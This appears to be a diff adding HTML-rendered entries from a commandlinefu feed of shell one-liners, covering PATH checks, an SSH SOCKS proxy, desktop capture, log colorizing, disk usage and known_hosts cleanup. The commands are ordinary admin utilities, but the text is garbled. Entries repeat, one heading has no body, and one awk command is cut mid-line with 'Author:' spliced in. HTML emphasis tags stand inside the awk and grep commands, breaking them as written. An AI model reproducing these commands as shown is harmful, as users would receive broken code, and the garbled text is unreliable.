+<p>$ ssh -o ProxyCommand=&#39;nc -x ProxyHost:8080 %h %p&#39; TargetHost</p>
+
+<p>If you are blocked or need to use a Socks proxy</p>
+
+<h1>Title: Add directory to $PATH if it&#39;s not already there</h1>
+
+<p>$ if [[ &quot;:$PATH:&quot; != <em>&quot;:$dir:&quot;</em> ]]; then PATH=${PATH}:$dir; fi</p>
+
+<p>Sometimes in a script you want to make sure that a directory is in the path, 
+and add it in if it&#39;s not already there. In this example, $dir contains the new
+directory you want to add to the path if it&#39;s not already present. </p>
+
+<p>There are multiple ways to do this, but this one is a nice clean shell-internal
+approach. I based it on http://stackoverflow.com/a/1397020.[1]</p>
+
+<p>You can also do it using tr to separate the path into lines and grep -x to look
+for exact matches, like this:
+if ! $(echo &quot;$PATH&quot; | tr &quot;:&quot; &quot;\n&quot; | grep -qx &quot;$dir&quot;) ; then PATH=$PATH:$dir ; 
+fi</p>
+
+<p>which I got from http://stackoverflow.com/a/5048977.[2]</p>
+
+<p>Or replace the &quot;echo | tr&quot; part with a shell parameter expansion, like 
+if ! $(echo &quot;${PATH//:/$&#39;\n&#39;}&quot; | grep -qx &quot;$dir&quot;) ; then PATH=$PATH:$dir ; fi</p>
+
+<p>which I got from http://www.commandlinefu.com/commands/view/3209/.[3]</p>
+
+<p>There are also other more regex-y ways to do it, but I find the ones listed 
+here easiest to follow.</p>
+
+<p>Note some of this is specific to the bash shell.</p>
+
+<h1>Title: Capture video of a linux desktop</h1>
+
+<p>$ ffmpeg -f x11grab -s wxga -r 25 -i :0.0+1366,0 -qscale 0 /tmp/out.mpg</p>
+
+<p>This is identical to the original command, but allows you to specify an offset 
+if you have multiple monitors. In this case you&#39;ll record a 1366x768 window 
+that&#39;s offset by 1366 pixels in the x axis and 0 pixels in the y axis. Note 
+also that the -sameq option has been replaced by -qscale - at least in ffmpeg 
+version 1.2.1 on Fedora 19.</p>
+
+<h1>Title: Colorizes an access log</h1>
+
+<p>$ function colorize() { c=&quot;--line-buffered --color=yes&quot;; GREP<em>COLORS=&quot;mt=01;34&quot;
+egrep $c &#39;(^| 200 | 304 )&#39; &quot;${@}&quot; | GREP</em>COLORS=&quot;mt=02;31&quot; egrep $c 
+&#39;(^|&quot;(GET|POST) .*[^0-9] 4[0-1][0-9] )&#39; | GREP_COLORS=&quot;ms=02;37&quot; egrep $c 
+&#39;(^|^[0-9.]+) &#39;;}</p>
+
+<p>Puts a splash of color in your access logs. IP addresses are gray, 200 and 304 
+are green, all 4xx errors are red. Works well with e.g. &quot;colorize access_log | 
+less -R&quot; if you want to see your colors while paging.</p>
+
+<p>Use as inspiration for other things you might be tailing, like syslog or vmstat</p>
+
+<p>Usage:
+tail -f access.log | colorize</p>
+
+<h1>Title: Display the human-readable sizes of all files and folders in the current directory with 3 decimal places</h1>
+
+<p>$ du -Lsbc * | awk &#39;function hr(bytes) 
+{hum[1024<strong>4]=&quot;TiB&quot;;hum[1024</strong>3]=&quot;GiB&quot;;hum[1024<strong>2]=&quot;MiB&quot;;hum[1024]=&quot;kiB&quot;;hum[1]=&quot;B&quot;;
+for (x=1024</strong>3;x&gt;=1;x/=1024) {if (bytes&gt;=x){return sprintf(&quot;%8.3f %s&quot;, bytes/x,
+hum[x]);}}} {print hr($1) &quot;\t&quot; $2}&#39;</p>
+
+<p>To sort the list by file/directory size, insert <code>sort -n |</code> before <code>awk</code>.</p>
+
+<h1>Title: Download Englishword pronounciation as mp3 file</h1>
+
+<p>Author: 
+Date: Wed, 31 Jul 2013 23:42:24 +0400
+Link: http://feedproxy.google.com/~r/Command-line-fu/~3/Mf8x67hlG_0/download-englishword-pronounciation-as-mp3-file</p>
+
+<p>$ word=&quot;apple&quot;; wget 
+http://ssl.gstatic.com/dictionary/static/sounds/de/0/$word.mp3</p>
+
+<h1>Title: Find last modified files in a directory and its subdirectories</h1>
+
+<p>$ find . -type f -print0 | xargs -0 stat --printf &#39;%Y :%y %12s %n\n&#39; | sort -nr
+| cut -d: -f2- | head</p>
+
+<p>Goes through all files in the directory specified, uses <code>stat</code> to print out 
+last modification time, then sorts numerically in reverse, then uses cut to 
+remove the modified epoch timestamp and finally head to only output the last 10
+modified files.</p>
+
+<p>Note that on a Mac <code>stat</code> won&#39;t work like this, you&#39;ll need to use either:
+find . -type f -print0 | xargs -0 stat -f &#39;%m%t%Sm %12z %N&#39; | sort -nr | cut 
+-f2- | head</p>
+
+<p>or alternatively do a <code>brew install coreutils</code> and then replace <code>stat</code> with 
+<code>gstat</code> in the original command.</p>
+
+<h1>Title: Graphically show percent of mount space used</h1>
+
+<p>$ for m in <code>df -P | awk -F &#39; &#39; &#39;{print $NF}&#39; | sed -e &quot;1d&quot;</code>;do n=<code>df -P | grep 
+&quot;$m$&quot; | awk -F &#39; &#39; &#39;{print $5}&#39; | cut -d% -f1</code>;i=0;if [[ $n =~ ^-?[0-9]+$ 
+]];then printf &#39;%-25s&#39; $m;while [ $i -lt $n ];do echo -n &#39;=&#39;;let 
+&quot;i=$i+1&quot;;done;echo &quot; $n&quot;;fi;done</p>
+
+<p>Automatically drops mount points that have non-numeric sizes (e.g. /proc). 
+Tested in bash on Linux and AIX.</p>
+
+<h1>Title: Redirecting bash output into any X Window</h1>
+
+<p>$ alias 2edit=&#39;xsel -b;n=pipe$RANDOM;xdotool exec --terminator -- mousepad $n 
+-- search --sync --onlyvisible --name $n key --window %1 ctrl+v&#39;</p>
+
+<p>bash output is inserted into the clipboard, then mousepad is started and the 
+clipboard content is pasted. xsel and xdotool needs to be installed. Instead of
+the mousepad any other editor can be used. I&#39;ve successfully tested the Sublime
+Text Editor and it opens a new tab for each new paste. Check Sample output for 
+a usage example. This command is originated from here - http://goo.gl/0q9UT4[1]</p>
+
+<h1>Title: Removes single line from known_hosts file</h1>
+
+<p>$ rhost() { if [[ $1 =~ ^[0-9]+$ ]]; then sed -i &quot;$1&quot;d 
+${HOME}/.ssh/known_hosts; else echo &quot;rhost [n]&quot;; fi }</p>
+
+<p>Quickly remove the conflicting line (key) from current users known<em>hosts file 
+when there is an SSH host conflict. Very nice when you get tired of writing out
+full commands. Ideally you would place this into your .bash</em>profile</p>
+
+<p>Usage: rhost [n]</p>
+
+<p>Example: rhost 33 (removes line 33 from ~/.ssh/known_hosts)</p>
+
+<p>Function assumes the $HOME exists, you could alternatively use 
+&quot;~/.ssh/known_hosts&quot;</p>
+
+<p>Mac OSX likes a space for sed -i &quot;$1&quot; d</p>
+
+<h1>Title: Show how old your linux OS installtion is</h1>
+
+<p>$ sudo tune2fs -l $(df -h / |(read; awk &#39;{print $1; exit}&#39;)) | grep -i created</p>
+
+<p>..not guaranteed to always be accurate but fun to see how old you Linux 
+installation is based on the root partitions file system creation date.</p>
+
+<h1>Title: Add directory to $PATH if it&#39;s not already there</h1>
+
+<p>$ if [[ &quot;:$PATH:&quot; != <em>&quot;:$dir:&quot;</em> ]]; then PATH=${PATH}:$dir; fi</p>
+
+<p>Sometimes in a script you want to make sure that a directory is in the path, 
+and add it in if it&#39;s not already there. In this example, $dir contains the new
+directory you want to add to the path if it&#39;s not already present. </p>
+
+<p>There are multiple ways to do this, but this one is a nice clean shell-internal
+approach. I based it on http://stackoverflow.com/a/1397020.[1]</p>
+
+<p>You can also do it using tr to separate the path into lines and grep -x to look
+for exact matches, like this:
+if ! $(echo &quot;$PATH&quot; | tr &quot;:&quot; &quot;\n&quot; | grep -qx &quot;$dir&quot;) ; then PATH=$PATH:$dir ; 
+fi</p>
+
+<p>which I got from http://stackoverflow.com/a/5048977.[2]</p>
+
+<p>Or replace the &quot;echo | tr&quot; part with a shell parameter expansion, like 
+if ! $(echo &quot;${PATH//:/$&#39;\n&#39;}&quot; | grep -qx &quot;$dir&quot;) ; then PATH=$PATH:$dir ; fi</p>
+
+<p>which I got from http://www.commandlinefu.com/commands/view/3209/.[3]</p>
+
+<p>There are also other more regex-y ways to do it, but I find the ones listed 
+here easiest to follow.</p>
+
+<p>Note some of this is specific to the bash shell.</p>
+
+<h1>Title: Capture video of a linux desktop</h1>
+
+<h1>Title: Display the human-readable sizes of all files and folders in the current directory with 3 decimal places</h1>
+
+<p>Author: 
+Date: Sun, 18 Aug 2013 06:28:18 +0400
+Link: http://feedproxy.google.com/~r/Command-line-fu/~3/dbibn5U5_jw/display-the-human-readable-sizes-of-all-files-and-folders-in-the-current-directory-with-3-decimal-places</p>
+
+<p>$ du -Lsbc * | awk &#39;function hr(bytes) 
+{hum[1024<strong>4]=&quot;TiB&quot;;hum[1024</strong>3]=&quot;GiB&quot;;hum[1024<strong>2]=&quot;MiB&quot;;hum[1024]=&quot;kiB&quot;;hum[1]=&quot;B&quot;;
+for (x=1024</strong>3;x&gt;=1;x/=1024) {if (bytes&gt;=x){return sprintf(&quot;%8.3f %s&quot;, bytes/x,
+Author: </p>
+
+<h1>Title: Graphically show percent of mount space used</h1>
+
+<p>Author: 
+Date: Tue, 30 Jul 2013 00:12:39 +0400
+Link: http://feedproxy.google.com/~r/Command-line-fu/~3/30Zy05hsEaE/graphically-show-percent-of-mount-space-used</p>
+
+<p>$ for m in <code>df -P | awk -F &#39; &#39; &#39;{print $NF}&#39; | sed -e &quot;1d&quot;</code>;do n=<code>df -P | grep 
+&quot;$m$&quot; | awk -F &#39; &#39; &#39;{print $5}&#39; | cut -d% -f1</code>;i=0;if [[ $n =~ ^-?[0-9]+$ 
+]];then printf &#39;%-25s&#39; $m;while [ $i -lt $n ];do echo -n &#39;=&#39;;let 
+&quot;i=$i+1&quot;;done;echo &quot; $n&quot;;fi;done</p>
+
+<p>Automatically drops mount points that have non-numeric sizes (e.g. /proc). 
+Tested in bash on Linux and AIX.</p>
+
+<h1>Title: Redirecting bash output into any X Window</h1>
+
+<p>$ alias 2edit=&#39;xsel -b;n=pipe$RANDOM;xdotool exec --terminator -- mousepad $n 
+-- search --sync --onlyvisible --name $n key --window %1 ctrl+v&#39;</p>
+
+<p>bash output is inserted into the clipboard, then mousepad is started and the 
+clipboard content is pasted. xsel and xdotool needs to be installed. Instead of
+the mousepad any other editor can be used. I&#39;ve successfully tested the Sublime
+Text Editor and it opens a new tab for each new paste. Check Sample output for 
+a usage example. This command is originated from here - http://goo.gl/0q9UT4[1]</p>
+
+<h1>Title: Show how old your linux OS installtion is</h1>
+
+<p>$ sudo tune2fs -l $(df -h / |(read; awk &#39;{print $1; exit}&#39;)) | grep -i created</p>
+
+<p>..not guaranteed to always be accurate but fun to see how old you Linux 
+installation is based on the root partitions file system creation date.</p>
+
+<h1>Title: Threads and processes of a user</h1>
+
+<p>$ $ ps -LF -u user</p>
+
+<p>Piping ps into grep is mostly useless: ps has its own filter options like -u 
+and -C</p>
+
+<h1>Title: whereami() { namei &quot;$PWD&quot; -x -m | sed -r &#39;s@f:\s(.<em>)@&#39;$bold$red&#39;\1&#39;$reset&#39;@&#39; | sed -r &#39;s@^\s(\s</em>)D@&#39;$bold$yellow&#39;\1Mn&#39;$reset&#39;@&#39; | sed -r &#39;s@^\s(\s*)l@&#39;$bold$cyan&#39;\1Ln&#39;$reset&#39;@&#39; }</h1>
